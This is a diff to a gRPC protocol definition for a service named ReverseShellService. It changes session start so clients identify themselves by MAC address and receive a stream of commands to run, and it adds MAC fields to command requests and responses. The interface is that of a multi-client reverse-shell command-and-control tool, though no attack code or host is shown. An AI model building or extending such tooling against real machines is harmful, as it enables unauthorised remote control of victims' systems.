@@ -4,24 +4,32 @@ package reverse_shell;
 
 // The ReverseShellService definition.
 service ReverseShellService {
-  rpc StartSession(stream CommandRequest) returns (stream CommandResponse);
-  rpc StreamResponses(stream CommandResponse) returns (stream CommandResponse);
+  rpc StartSession (ClientInfo) returns (stream CommandRequest);
+  rpc StreamResponses (stream CommandResponse) returns (stream CommandResponse);
   rpc AddCommand (CommandRequest) returns (Empty);
-  rpc GetResponse(RequestID) returns (stream CommandResponse);
+  rpc GetResponse (RequestID) returns (stream CommandResponse);
 }
 
 message Empty {}
+
+// Information about the client connecting to the server.
+message ClientInfo {
+  string mac_address = 1;
+}
+
 // The request message containing the command to be executed.
 message CommandRequest {
   string request_id = 1;
   string command = 2;
+  string macAddress = 3; // Added field for client identification
 }
 
-// The response message containing the output of the command.S
+// The response message containing the output of the command.
 message CommandResponse {
   string request_id = 1;
   string output = 2;
   bool is_active = 3;
+  string macAddress = 4; // Added field for client identification
 }
 
 message RequestID {
